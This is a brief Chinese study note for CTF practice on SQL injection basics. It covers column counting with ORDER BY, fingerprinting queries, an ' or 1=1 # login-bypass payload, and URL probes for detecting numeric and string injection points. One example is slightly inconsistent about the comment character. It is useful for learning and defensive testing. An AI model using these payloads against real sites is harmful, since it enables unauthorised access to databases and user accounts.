---
title: SQL注入
tags:
  - Note
  - Security
  - CTF
---

## 基本操作

1.测试数据库表列数

    `select colA from table order by 1` 不断增加`order by`后面的数字，可以测试出table的表列数。

2.查询数据库名字`select database()`

3.查询当前用户`select user()`

4.查询数据库版本`select version()`

5.查询操作系统`select @@version_compile_os`
    
6.数据库自带数据库为`information_schema` 其下包含tables表，包含所有创建的表，schema 为`table_name, table_schema`

7.绕过验证

 原始验证的sql语句`select * from users where username='123' and password='123'`
 
 注入代码`123' or 1=1 `到username字段
 
 实际执行代码`select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`
 
 由于在where判断的时候 `1=1`恒为真，所以语句执行成功，查询到所有用户。
 
 ## SQL注入点判断方法
 
 ### 单引号判断法
 
 `http://xxx/abc.php?id=1'` 查看页面是否出错，分为字符型和数字型。
 
 #### 数字型
 
 1.使用`http://xxx/abc.php?id= x and 1=1`判断，页面正常运行
 
 2.使用`http://xxx/abc.php?id= x and 1=2`判断，页面出错
 
 若为字符型，则运行
 ```sql
select * from <表名> where id = 'x and 1=1' 

select * from <表名> where id = 'x and 1=2' 
 ```
 
 #### 字符型
 
 测试方法：
 
 1.`http://xxx/abc.php?id= x' and '1'='1` 正常运行
 
 2.` http://xxx/abc.php?id= x' and '1'='2`出错
 
 实际执行`select * from <表名> where id = 'x' and '1'='1'`
 
 
 
 